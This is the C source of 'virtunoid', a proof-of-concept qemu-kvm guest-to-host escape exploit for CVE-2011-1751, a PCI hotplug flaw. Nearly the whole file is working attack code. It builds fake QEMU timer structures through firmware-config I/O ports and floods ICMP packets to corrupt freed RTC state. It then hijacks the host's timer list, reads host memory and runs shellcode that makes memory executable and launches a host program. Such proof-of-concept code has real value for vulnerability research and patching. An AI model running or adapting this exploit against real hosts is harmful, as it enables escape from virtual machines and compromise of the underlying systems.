/* virtunoid.c: qemu-kvm escape exploit, 0.13.51 <= qemu-kvm <= 0.14.50
 *  by Nelson Elhage <nelhage@nelhage.com>
 *
 * Exploits CVE-2011-1751, insufficient checking in PCI hotplug.
 *
 * The underlying bug exists since qemu-kvm 0.11.51, but this exploit
 * uses features introduced in qemu-kvm 0.13.51. We choose to do this
 * for simplicity, and in order to limit the scope of this exploit,
 * since this is intended as a proof-of-concept.
 */

#include <sys/io.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip_icmp.h>
#include <stdint.h>
#include <assert.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <linux/rtc.h>
#include <sched.h>

#define offsetof __builtin_offsetof

#define min(a,b) ({                             \
    typeof(a) __a = a;                          \
    typeof(b) __b = b;                          \
    __a < __b ? __a : __b;                      \
        })

void die(const char *msg, ...) {
    char buf[8192];
    va_list ap;
    va_start(ap, msg);
    vsnprintf(buf, sizeof buf, msg, ap);
    va_end(ap);

    fprintf(stderr, "%s\n", buf);
    exit(1);
}

void die_errno(const char *msg) {
    die("%s: %s", msg, strerror(errno));
}

typedef uint64_t hva_t;
typedef uint64_t gpa_t;
typedef uint64_t gfn_t;
typedef void    *gva_t;

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_SWAPPED (1ull << 62)
#define PFN_PFN     ((1ull << 55) - 1)


#define BIOS_CFG_IOPORT 0x510
#define BIOS_CFG_DATAPORT (BIOS_CFG_IOPORT + 1)
#define FW_CFG_WRITE_CHANNEL    0x4000
#define FW_CFG_ARCH_LOCAL       0x8000

#define FW_CFG_E820_TABLE (FW_CFG_ARCH_LOCAL + 3)
#define FW_CFG_HPET (FW_CFG_ARCH_LOCAL + 4)

/***********************************************************************/

#include "virtunoid-config.h"

struct QEMUClock {
    uint32_t type;
    uint32_t enabled;
};

struct QEMUTimer {
    hva_t clock;
    int64_t expire_time;
#ifdef HAVE_TIMER_SCALE
    int scale;
#endif
    hva_t cb;           /* void (*)(void*) */
    hva_t opaque;       /* void* */
    hva_t next;         /* struct QEMUTimer * */
};

struct IORangeOps {
    /*    void (*read)(IORange *iorange, uint64_t offset, unsigned width,
              uint64_t *data);
          void (*write)(IORange *iorange, uint64_t offset, unsigned width,
              uint64_t data);
    */
    hva_t read;
    hva_t write;
};

struct IORange {
    hva_t ops;
    uint64_t base;
    uint64_t len;
};

/*********************************************************************/

struct target_region {
    hva_t hva;
    uint8_t *data;
    size_t len;
    uint16_t entry;
    uint8_t *alloc;
    uint8_t *snapshot;
};

uint8_t buf[SIZEOF_E820_TABLE+2*PAGE_SIZE+SIZEOF_HPET_CFG];

struct target_region targets[] = {
    { E820_TABLE, buf, SIZEOF_E820_TABLE, FW_CFG_E820_TABLE },
    { HPET_CFG, buf + SIZEOF_E820_TABLE + PAGE_SIZE, SIZEOF_HPET_CFG, FW_CFG_HPET },
    { 0, 0, 0, 0}
};

uint64_t *fake_rtc;

void commit_targets(void) {
    struct target_region *t = targets;
    fake_rtc[OFFSET_RTCSTATE_NEXT_SECOND_TIME/sizeof(*fake_rtc)] = 10;
    for (; t->data; t++) {
        int i;
        outw(FW_CFG_WRITE_CHANNEL | t->entry, BIOS_CFG_IOPORT);
        for (i = 0; i < t->len - 1; i++)
            outb(t->data[i], BIOS_CFG_DATAPORT);
#ifdef DEBUG_COMMIT
        outw(FW_CFG_WRITE_CHANNEL | t->entry, BIOS_CFG_IOPORT);
        for (i = 0; i < t->len - 1; i++)
            assert(inb(BIOS_CFG_DATAPORT) == t->data[i]);
#endif
    }
}

void refresh_targets(void) {
    struct target_region *t = targets;
    for (; t->data; t++) {
        int i;
        outw(FW_CFG_WRITE_CHANNEL | t->entry, BIOS_CFG_IOPORT);
        for (i = 0; i < t->len - 1; i++)
            t->data[i] = inb(BIOS_CFG_DATAPORT);
    }
}

void snapshot_targets(void) {
    struct target_region *t = targets;
    for (; t->data; t++)
        t->snapshot = t->alloc;
}

void rollback_targets(void) {
    struct target_region *t = targets;
    for (; t->data; t++)
        t->alloc = t->snapshot;
}

void *host_alloc(size_t size) {
    struct target_region *t = targets;
    for (; t->data; t++) {
        size_t free;
        if (!t->alloc) {
            t->alloc = t->data;
        }
        free = t->data + t->len - 1 - t->alloc;
        if (free >= size) {
            void *p = t->alloc;
            t->alloc += size;
            return p;
        }
    }
    printf("host_alloc(%d) failed!\n", (unsigned)size);
    assert(0);
}

void* obj_alloc(size_t start, size_t last) {
    size_t need = last - start;
    void *ptr = host_alloc(need);
    return ptr - start;
}

/*********************************************************************/

uint32_t page_offset(unsigned long addr) {
    return addr & ((1 << PAGE_SHIFT) - 1);
}

gfn_t gva_to_gfn(gva_t addr) {
    static int fd = -1;
    size_t off;
    uint64_t pte, pfn;


    if (fd < 0)
        fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0)
        die_errno("open");
    off = ((uintptr_t)addr >> 9) & ~7;
    if (lseek(fd, off, SEEK_SET) != off)
        die_errno("lseek");

    if (read(fd, &pte, 8) != 8)
        die_errno("read");
    if (!(pte & PFN_PRESENT))
        return (gfn_t)-1;

    pfn = pte & PFN_PFN;
    return pfn;
}

gpa_t gva_to_gpa(gva_t addr) {
    gfn_t gfn = gva_to_gfn(addr);
    assert(gfn != (gfn_t)-1);
    return (gfn << PAGE_SHIFT) | page_offset((unsigned long)addr);
}

hva_t highmem_hva_base = 0;

hva_t gpa_to_hva(gpa_t gpa) {
    assert (gpa > 0x00100000);
    return gpa  + highmem_hva_base;
}

hva_t gva_to_hva(gva_t addr) {
    struct target_region *r;
    for (r = targets; r->data; r++)
        if (addr > (gva_t)r->data - PAGE_SIZE &&
            addr < (gva_t)r->data + r->len) {
            return r->hva + (addr - (gva_t)r->data);
        }

    return gpa_to_hva(gva_to_gpa(addr));
}

/* Offset of the ICMP header inside qemu's net queue buffer */
#define PACKET_OFFSET   74

#define PORT 0xae08
#define QEMU_GATEWAY  "10.0.2.2"

u_short in_cksum(const u_short *addr, register int len, u_short csum);

struct QEMUTimer *fake_timer(hva_t cb, hva_t opaque, struct QEMUTimer *next) {
    struct QEMUTimer *timer = host_alloc(sizeof *timer);
    memset(timer, 0, sizeof *timer);
    timer->clock = CLOCK_HVA;
#ifdef HAVE_TIMER_SCALE
    timer->scale = 1;
#endif
    timer->cb = cb;
    timer->opaque = opaque;
    timer->next = next ? gva_to_hva(next) : 0;
    return timer;
}

#define page_aligned __attribute__((aligned(PAGE_SIZE)))

struct shared_state {
    char prog[1024];
    hva_t shellcode;
    int done;
};

static volatile page_aligned struct shared_state share = {
    .prog = "/usr/bin/gnome-calculator",
};

void shellcode(struct shared_state *share) {
    ((void(*)(int, int))ISA_UNASSIGN_IOPORT)(0x70, 2);
    ((typeof(mprotect)*)MPROTECT)((void*)share->shellcode,
                                  2*PAGE_SIZE,
                                  PROT_READ|PROT_WRITE|PROT_EXEC);
    char *args[2] = {share->prog, NULL};
    if (((typeof(fork)*)FORK)() == 0)
        ((typeof(execv)*)EXECV)(share->prog, args);
    share->done = 1;
}
asm("end_shellcode:");
extern char end_shellcode[];

struct QEMUTimer *construct_read(struct QEMUTimer *timer, hva_t hva, uint32_t **out) {
    uint32_t *ptr = host_alloc(sizeof *ptr);
    *out = ptr;

    timer = fake_timer(BDRV_RW_EM_CB, gva_to_hva(ptr), timer);
    timer = fake_timer(KVM_ARCH_DO_IOPERM, hva - 8, timer);
    timer = fake_timer(QEMU_GET_RAM_PTR, 1<<20, timer);

    return timer;
}

struct QEMUTimer *construct_payload(void) {
    struct IORange *ioport;
    struct IORangeOps *ops;
    struct QEMUTimer *timer;

    ops = malloc(sizeof *ops);
    ops->read = MPROTECT;
    ops->write = 0;

    ioport = valloc(2*PAGE_SIZE);
    ioport->ops = gva_to_hva(ops);
    ioport->base = -(2*PAGE_SIZE);

    share.shellcode = gva_to_hva(ioport);

    memcpy(ioport + 1, shellcode, (void*)end_shellcode - (void*)shellcode);

    timer = NULL;
    timer = fake_timer(gva_to_hva(ioport+1), gva_to_hva((void*)&share), timer);
    timer = fake_timer(IOPORT_READL_THUNK, gva_to_hva(ioport), timer);
    timer = fake_timer(CPU_OUTL, 0, timer);
    return timer;
}

uint64_t read_host8(struct QEMUTimer *head, struct QEMUTimer *chain, hva_t addr) {
    uint64_t val = 0;
    uint32_t *low, *hi;

    struct QEMUTimer *timer = chain;
    timer->next = 0;
    timer = construct_read(timer, addr, &low);
    timer = construct_read(timer, addr + 4, &hi);
    head->next = gva_to_hva(timer);
    head->expire_time = 0;
    *hi = (uint32_t)-1;
    commit_targets();
    while (*hi == (uint32_t)-1) {
        sleep(1);
        refresh_targets();
    }
    val = ((uint64_t)*hi << 32) | (uint64_t)*low;
    rollback_targets();
    return val;
}

void wait_rtc(void) {
    int fd;
    int val;
    if ((fd = open("/dev/rtc", O_RDONLY)) < 0)
        die_errno("open(/dev/rtc)");
    if (ioctl(fd, RTC_UIE_ON, 0) < 0)
        die_errno("RTC_UIE_ON");
    if (read(fd, &val, sizeof val) != sizeof(val))
        die_errno("read()");
    if (ioctl(fd, RTC_UIE_OFF, 0) < 0)
        die_errno("RTC_UIE_OFF");
    close(fd);
    outb(10,   0x70);
    outb(0xF0, 0x71);
}

int main(void) {
    int fd;
    int i;
    unsigned char packet[SIZEOF_RTCSTATE - PACKET_OFFSET];
    struct icmphdr *icmp = (struct icmphdr*)packet;
    struct sockaddr_in dest = {};
    struct QEMUTimer *timer, *timer2;
    hva_t timer_hva;
    hva_t ram_block;
    struct sched_param parm = {.sched_priority = 99};
    memset(buf, 0, sizeof buf);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0)
        die_errno("socket");

    if (sched_setscheduler(0, SCHED_FIFO, &parm) < 0)
        die_errno("setscheduler");

    dest.sin_family = AF_INET;
    dest.sin_port = 0;
    dest.sin_addr.s_addr = inet_addr(QEMU_GATEWAY);

    memset(packet, 0x33, sizeof(packet));
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.id = 0xabcd;
    icmp->un.echo.sequence = htons(1);
    icmp->checksum = 0;

    /*
    clock = malloc(sizeof *clock);
    clock->type = 0;
    clock->enabled = 1;
    */

    assert(OFFSET_RTCSTATE_NEXT_SECOND_TIME <
           OFFSET_RTCSTATE_SECOND_TIMER);
    fake_rtc = obj_alloc(OFFSET_RTCSTATE_NEXT_SECOND_TIME,
                    SIZEOF_RTCSTATE);

    timer = fake_timer(RTC_UPDATE_SECOND, gva_to_hva(fake_rtc), 0);
    timer2 = fake_timer(RTC_UPDATE_SECOND, gva_to_hva(fake_rtc), 0);
    timer_hva = gva_to_hva(timer);

    // memset(rtc, 0x77, SIZEOF_RTCSTATE);
    fake_rtc[OFFSET_RTCSTATE_SECOND_TIMER/sizeof(*fake_rtc)] = timer_hva;
    fake_rtc[OFFSET_RTCSTATE_NEXT_SECOND_TIME/sizeof(*fake_rtc)] = 10;

#define RTC(type, offset) (type*)(packet + (offset) - PACKET_OFFSET)

    *RTC(hva_t, OFFSET_RTCSTATE_SECOND_TIMER) = timer_hva;
    *RTC(uint64_t, OFFSET_RTCSTATE_NEXT_SECOND_TIME) = 10;

    icmp->checksum = in_cksum((void*)&packet, sizeof packet, 0);

    snapshot_targets();

    if (iopl(3))
        die_errno("iopl");

    commit_targets();

    printf("[+] Waiting for RTC interrupt...\n");
    wait_rtc();
    printf("[+] Triggering hotplug...\n");
    outl(2, PORT);
    i = 0;
    while (timer->expire_time == 0) {
        sendto(fd, &packet, sizeof packet, 0,
               (struct sockaddr*)&dest, sizeof dest);
        if (++i % 1000 == 0)
            refresh_targets();
    }
    printf("[+] Timer list hijacked. Reading highmem base...\n");
    ram_block = read_host8(timer, timer2, ADDR_RAMLIST_FIRST);
    printf("[+] ram_block = %016lx\n", ram_block);
    highmem_hva_base = read_host8(timer, timer2, ram_block);
    printf("[+] highmem hva base = %016lx\n", highmem_hva_base);
    printf("[+] Go!\n");
    timer->next   = gva_to_hva(construct_payload());
    timer->expire_time = 0;
    commit_targets();
    while (!share.done)
        sleep(1);
    printf("[+] Done!\n");

    return 0;
}


/* Taken from iputils ping.c */
u_short
in_cksum(const u_short *addr, register int len, u_short csum)
{
	register int nleft = len;
	const u_short *w = addr;
	register u_short answer;
	register int sum = csum;

	/*
	 *  Our algorithm is simple, using a 32 bit accumulator (sum),
	 *  we add sequential 16 bit words to it, and at the end, fold
	 *  back all the carry bits from the top 16 bits into the lower
	 *  16 bits.
	 */
	while (nleft > 1)  {
		sum += *w++;
		nleft -= 2;
	}

	/* mop up an odd byte, if necessary */
	if (nleft == 1)
		sum += htons(*(u_char *)w << 8);

	/*
	 * add back carry outs from top 16 bits to low 16 bits
	 */
	sum = (sum >> 16) + (sum & 0xffff);	/* add hi 16 to low 16 */
	sum += (sum >> 16);			/* add carry */
	answer = ~sum;				/* truncate to 16 bits */
	return (answer);
}
